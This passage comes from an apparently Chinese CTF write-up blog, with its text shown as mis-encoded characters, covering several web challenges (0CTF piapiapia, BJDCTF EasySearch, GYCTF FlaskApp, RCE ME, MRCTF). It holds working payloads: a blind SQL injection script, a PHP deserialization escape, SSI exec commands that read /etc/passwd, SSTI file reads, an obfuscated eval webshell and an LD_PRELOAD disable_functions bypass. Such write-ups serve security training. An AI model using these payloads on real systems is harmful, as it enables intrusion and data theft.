<span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        parma<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"2^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>parma<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Ohhh You find the flag read on!"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>æ²¡å•¥å†…å®¹å…ˆæ‰«ç›®å½•ï¼Œ<a href="http://www.zipæ‰«å‡ºæºç ,å‘ç°æœ‰éšè—çš„æ³¨å†Œé¡µé¢,å…ˆè¿›è¡Œæ³¨å†Œå’Œç™»å½•,ç„¶åå†æŸ¥çœ‹æºç /">www.zipæ‰«å‡ºæºç ï¼Œå‘ç°æœ‰éšè—çš„æ³¨å†Œé¡µé¢ï¼Œå…ˆè¿›è¡Œæ³¨å†Œå’Œç™»å½•ï¼Œç„¶åå†æŸ¥çœ‹æºç </a></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">index.phpå’Œregister.phpä¸€ä¸ªç™»å½•ä¸€ä¸ªæ³¨å†Œclass.phpå…³é”®å‡½æ•°public function filter($string) &#123;$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;return preg_replace($safe, &#39;hacker&#39;, $string);&#125;update.phpæ›´æ–°ä¸ªäººä¿¡æ¯å†…å®¹if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;$username &#x3D; $_SESSION[&#39;username&#39;];if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))die(&#39;Invalid phone&#39;);if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))die(&#39;Invalid email&#39;);if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)die(&#39;Invalid nickname&#39;);$file &#x3D; $_FILES[&#39;photo&#39;];if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)die(&#39;Photo size error&#39;);move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);$user-&gt;update_profile($username, serialize($profile));echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;&#125;profile.php$profile &#x3D; unserialize($profile);$phone &#x3D; $profile[&#39;phone&#39;];$email &#x3D; $profile[&#39;email&#39;];$nickname &#x3D; $profile[&#39;nickname&#39;];$photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));&#x2F;&#x2F;å…³é”®ï¼Œå¦‚æœå…¶ä¸­photoæ–‡ä»¶åæ˜¯config.phpå³å¯è¯»å–åˆ°flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ¼æ´ï¼š</p><pre class="line-numbers language-none"><code class="language-none">åŸå§‹åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ša:1:&#123;s:5:&quot;phone&quot;;s:5:&quot;where&quot;;&#125;æ­¤æ—¶è¯»å–åˆ°çš„å†…å®¹æ˜¯phone&#x3D;whereå°†å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ï¼Œpreg_replace(&#39;where&#39;, &#39;hacker&#39;, $string);åºåˆ—åŒ–åå­—ç¬¦ä¸²å˜ä¸ºa:1:&#123;s:5:&quot;phone&quot;;s:5:&quot;hacker&quot;;&#125;æ­¤æ—¶ååºåˆ—åŒ–åªè¯»å–å‰5ä½ï¼Œhackeï¼Œåé¢çš„rå°±å±äºé€ƒé€¸çš„å­—ç¬¦äº†ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ„é€ å‡ºä¸€ä¸ªèƒ½é€ƒé€¸è¶³å¤Ÿé•¿çš„å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è®©åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å­˜å…¥æˆ‘ä»¬éœ€è¦çš„å†…å®¹ï¼Œåœ¨æœ¬é¢˜ä¸­æˆ‘ä»¬æƒ³è¦ä¼ å…¥çš„æ˜¯s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;ï¼Œè€Œåˆå› ä¸ºæˆ‘ä»¬éœ€è¦å¯¹nicknameçš„å†…å®¹è¿›è¡Œç»•è¿‡ï¼Œæ­¤æ—¶nicknameæ˜¯ä¸€ä¸ªæ•°ç»„æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆéœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²å°±æ˜¯&quot;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;ï¼Œæ‰€ä»¥æœ€åæ„é€ payloadä½¿ç”¨å…³é”®å­—whereï¼Œæ›¿æ¢ä¸ºhackeråèƒ½æº¢å‡ºï¼Œä¸Šé¢å­—ç¬¦ä¸²æœ‰34ä¸ªå­—ç¬¦é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥34ä¸ªwhere+å­—ç¬¦ä¸²å³å¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">nickname[]&#x3D;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>æ‰«æï¼Œå¾—åˆ°index.php.swp</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpob_start();function get_hash()&#123;$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times$content &#x3D; uniqid().$random;return sha1($content); &#125;    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);***    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )    &#123;        $admin &#x3D; &#39;6d0bc1&#39;;        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text &#x3D; &#39;            ***            ***            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;            ******&#39;;            fwrite($shtml,$text);            fclose($shtml);            ***echo &quot;[!] Header  error ...&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;                &#125;else    &#123;***    &#125;***?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æ±‚passwordç»è¿‡md5å¤„ç†åå‰å…­ä½æ˜¯6d0bc1</p><p>è´´ä¸€ä¸ªçˆ†ç ´çš„è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠ“åŒ…å‘ç°å“åº”å¤´ä¸­</p><pre class="line-numbers language-none"><code class="language-none">Url_is_here: public&#x2F;11b26335b1b3d0a88c6ec7333d2f5f522d1237f2.shtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¿é—®å°è¯•XFF SSTIå¤±è´¥ï¼Œçœ‹çœ‹wpå§ï¼Œæ˜¯SSIæ³¨å…¥æ¼æ´</p><pre class="line-numbers language-none"><code class="language-none">SSI æ³¨å…¥å…¨ç§°Server-Side Includes Injectionï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSI æ˜¯ç±»ä¼¼äº CGIï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSI æ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆï¼Œä»‹ç»ä¸‹SHTMLï¼Œåœ¨SHTMLæ–‡ä»¶ä¸­ä½¿ç”¨SSIæŒ‡ä»¤å¼•ç”¨å…¶ä»–çš„htmlæ–‡ä»¶ï¼ˆ#includeï¼‰ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šå°†SHTMLä¸­åŒ…å«çš„SSIæŒ‡ä»¤è§£é‡Šï¼Œå†ä¼ é€ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶çš„HTMLä¸­å°±ä¸å†æœ‰SSIæŒ‡ä»¤äº†ã€‚æ¯”å¦‚è¯´æ¡†æ¶æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯é‡Œé¢çš„æ–‡ç« ï¼Œå…¶ä»–èœå•ç­‰å³å¯ä»¥ç”¨#includeå¼•ç”¨è¿›æ¥ã€‚</p><p><strong>â‘ æ˜¾ç¤ºæœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡&lt;#echo&gt;</strong></p><p>æœ¬æ–‡æ¡£åç§°ï¼š</p><p><code>&lt;!â€“#echo var=&quot;DOCUMENT_NAME&quot;â€“&gt;</code></p><p>ç°åœ¨æ—¶é—´ï¼š</p><p><code>&lt;!â€“#echo var=&quot;DATE_LOCAL&quot;â€“&gt;</code></p><p>æ˜¾ç¤ºIPåœ°å€ï¼š</p><p><code>&lt;! #echo var=&quot;REMOTE_ADDR&quot;â€“&gt;</code></p><p><strong>â‘¡å°†æ–‡æœ¬å†…å®¹ç›´æ¥æ’å…¥åˆ°æ–‡æ¡£ä¸­&lt;#include&gt;</strong></p><p><code>&lt;! #include file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</code></p><p><code>&lt;!--#include virtual=&quot;index.html&quot; --&gt;</code></p><p><code>&lt;! #include virtual=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</code></p><p><code>&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</code></p><p>æ³¨ï¼šfileåŒ…å«æ–‡ä»¶å¯ä»¥åœ¨åŒä¸€çº§ç›®å½•æˆ–å…¶å­ç›®å½•ä¸­ï¼Œä½†ä¸èƒ½åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­ï¼ŒvirtualåŒ…å«æ–‡ä»¶å¯ä»¥æ˜¯Webç«™ç‚¹ä¸Šçš„è™šæ‹Ÿç›®å½•çš„å®Œæ•´è·¯å¾„</p><p><strong>â‘¢æ˜¾ç¤ºWEBæ–‡æ¡£ç›¸å…³ä¿¡æ¯&lt;#flastmod&gt;&lt;#fsize&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°ç­‰)</strong></p><p>æ–‡ä»¶æœ€è¿‘æ›´æ–°æ—¥æœŸï¼š</p><p><code>&lt;! #flastmod file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</code></p><p>æ–‡ä»¶çš„é•¿åº¦ï¼š</p><p><code>&lt;!â€“#fsize file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</code></p><p><strong>â‘£ç›´æ¥æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„å„ç§ç¨‹åº&lt;#exec&gt;(å¦‚CGIæˆ–å…¶ä»–å¯æ‰§è¡Œç¨‹åº)</strong></p><p><code>&lt;!â€“#exec cmd=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</code></p><p><code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></p><p><code>&lt;!â€“#exec cgi=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</code></p><p><code>&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;â€“&gt;</code></p><p>å°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¯æ’å…¥CGIç¨‹åºæˆ–è€…æ˜¯å¸¸è§„åº”ç”¨ç¨‹åºçš„è¾“å…¥ï¼Œè¿™å–å†³äºä½¿ç”¨çš„å‚æ•°æ˜¯cmdè¿˜æ˜¯cgiã€‚</p><p><strong>â‘¤è®¾ç½®SSIä¿¡æ¯æ˜¾ç¤ºæ ¼å¼&lt;#config&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°æ˜¾ç¤ºæ–¹å¼</strong>)</p><p><strong>â‘¥é«˜çº§SSIå¯è®¾ç½®å˜é‡ä½¿ç”¨ifæ¡ä»¶è¯­å¥ã€‚</strong></p><p>æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥<code>&lt;!â€“#exec cmd=&quot;ç³»ç»Ÿå‘½ä»¤&quot;â€“&gt;</code>å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œpasswordå†…å®¹å·²ç¡®å®šï¼Œåªèƒ½é€šè¿‡usernameä¼ å…¥</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTusername&#x3D;&lt;!--#exec cmd&#x3D;&quot;cat ..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password&#x3D;2020666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>è§£å¯†å¤„SSTI</p><p>è¿‡æ»¤äº†*ï¼Œsystemï¼Œos</p><p>è¯•è¯•è¯»å–æ–‡ä»¶æºç ï¼Œæ‰¾åˆ°äº†é»‘åå•</p><p><code>black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]</code></p><p>ä½¿ç”¨åŠ å·ç»•è¿‡ï¼Œéå†æ ¹ç›®å½•</p><p><code>&#123;&#123;url_for.__globals__["o"+"s"].listdir('/')&#125;&#125;</code></p><p>å‘ç°<code>this_is_the_flag.txt</code>æ–‡ä»¶</p><p><code>&#123;&#123;url_for.__globals__['__builtins__'].open('/this_is_the_f' + 'lag.txt','r').read()&#125;&#125;</code></p><p>æ‹¿åˆ°flag</p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><pre class="line-numbers language-none"><code class="language-none">Cookie: username&#x3D;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å–åç»•è¿‡ï¼Œå…ˆè¯•è¯•phpinfo</p><pre class="line-numbers language-none"><code class="language-none">code&#x3D;(~%8F%97%8F%96%91%99%90)();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¦ç”¨å¤§é‡ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæ„é€ evalä½¿ç”¨èšå‰‘</p><pre class="line-numbers language-none"><code class="language-none">code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);&#x2F;&#x2F;assert((eval($_POST[a])))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å‘ç°è¯»ä¸åˆ°flagï¼Œçœ‹wpï¼Œæ˜¯ä¸€ä¸ªPHP7çš„ç¦ç”¨å‡½æ•°ç»•è¿‡æ¼æ´</p><pre class="line-numbers language-none"><code class="language-none">è¿™é‡Œç”¨å·¥å…·åœ°å€https:&#x2F;&#x2F;github.com&#x2F;yangyangwithgnu&#x2F;bypass_disablefunc_via_LD_PRELOADç”±äºåœ¨&#x2F;var&#x2F;tmpç›®å½• æœ‰ä¸Šä¼ æƒé™ï¼Œå¯ä»¥ä¸Šä¼ bypass_disablefun_x64.soå’Œbypass_disablefunc.phpï¼ˆé‡å‘½åä¸ºshell.phpï¼‰ï¼Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ç„¶åéœ€è¦æ„é€ ä¸€ä¸ªæ–°çš„payload:æ ¹æ®â€œ?code&#x3D;$&#123;*GET&#125;[_](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017&#x2F;p&#x2F;$&#123;_GET&#125;[_]);&amp;*&#x3D;assert&amp;_&#x3D;eval($_POST[&#39;a&#39;])â€ä½¿ç”¨çš„æ˜¯å¼‚æˆ–ç»•è¿‡ï¼Œæœ€åçš„payloadæ˜¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;shell.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>æŸ¥çœ‹æºç </p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];if(substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;die(&#39;Y0u are So cutE!&#39;);&#125;if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;echo &quot;you are going to the next ~&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æ±‚ä¼ å‚å˜é‡åä¸º<code>b_u_p_t</code>åˆè¦æ±‚é˜Ÿåˆ—å­—ç¬¦ä¸²ä¸­ä¸èƒ½æœ‰ä¸‹åˆ’çº¿ï¼Œå¯ä»¥ä½¿ç”¨ç©ºæ ¼ç»•è¿‡ï¼Œè€ŒåŒ¹é…èµ·å§‹ç»“å°¾éƒ½è¦æœ‰23333ï¼Œä½¿ç”¨æ¢è¡Œç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">?b u p t&#x3D;23333%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰brainfuckæ³¨é‡Šå†…å®¹ï¼Œåœ¨æ§åˆ¶å°æ‰§è¡Œï¼Œå‘ç°éœ€è¦POSTä¼ å‚Merakï¼Œä¼ å…¥åæŸ¥çœ‹ä»£ç </p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php error_reporting(0); include &#39;takeip.php&#39;;ini_set(&#39;open_basedir&#39;,&#39;.&#39;); include &#39;flag.php&#39;;if(isset($_POST[&#39;Merak&#39;]))&#123;     highlight_file(__FILE__);     die(); &#125; function change($v)&#123;     $v &#x3D; base64_decode($v);     $re &#x3D; &#39;&#39;;     for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123;         $re .&#x3D; chr ( ord ($v[$i]) + $i*2 );     &#125;     return $re; &#125;echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;$ip &#x3D; getIp();if($ip!&#x3D;&#39;127.0.0.1&#39;)echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;?&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ipåŒ¹é…ç»•è¿‡ä½¿ç”¨Client-ipè¯·æ±‚å¤´ï¼Œfile_get_contentsä½¿ç”¨dataä¼ªåè®®ä¼ å…¥</p><pre class="line-numbers language-none"><code class="language-none">?2333&#x3D;data:text&#x2F;plain,todat is a happy day&amp;file&#x3D;ZmpdYSZmXGI&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹æºç å¾—åˆ°flag</p><h2 